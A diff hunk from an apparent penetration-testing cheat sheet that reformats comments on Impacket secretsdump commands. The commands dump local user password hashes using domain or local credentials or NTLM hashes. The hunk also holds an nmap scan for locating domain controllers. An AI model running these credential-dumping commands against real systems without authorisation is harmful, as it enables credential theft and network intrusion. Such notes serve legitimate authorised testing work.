@@ -33,23 +33,23 @@ date: 2022-12-10
     
 ### Impacket secretsdump - DUMP Local User Hashes via Domain Creds
  
-    python3 secretsdump.py <Domain>/<Domain Username>:<Password>@<IP> (Enter with Domain Creds)
+    python3 secretsdump.py <Domain>/<Domain Username>:<Password>@<IP> #Enter with Domain Creds
     
 ### Impacket secretsdump - DUMP Local User Hashes via Domain NTLM Hash
 
-    python3 secretsdump.py <Domain>/<Domain Username>@<IP> -hashes <NTLM Hash> (Enter with NTLM Hash)
+    python3 secretsdump.py <Domain>/<Domain Username>@<IP> -hashes <NTLM Hash> #Enter with NTLM Hash
     
 ### Impacket secretsdump - DUMP Local User Hashes via Local User Creds
     
-    python3 secretsdump.py <Computer_Hostname>/<Local Username>:<Password>@<IP> (Enter with Local Creds)
+    python3 secretsdump.py <Computer_Hostname>/<Local Username>:<Password>@<IP> #Enter with Local Creds
     
 ### Impacket secretsdump - DUMP Local User Hashes via Local User Hash
 
-    python3 secretsdump.py <Computer_Hostname>/<Local Username>@<IP> -hashes <NTLM Hash> (Enter with NTLM Hash)
+    python3 secretsdump.py <Computer_Hostname>/<Local Username>@<IP> -hashes <NTLM Hash> #Enter with NTLM Hash
 
 ### Find Domain Controller In BlackBox Testing
 
-    nmap -p389,636 --open -iL <IP_List_File> - 389(LDAP) / 636(LDAP-SSL)
+    nmap -p389,636 --open -iL <IP_List_File>  #389(LDAP) / 636(LDAP-SSL)
     
     
     
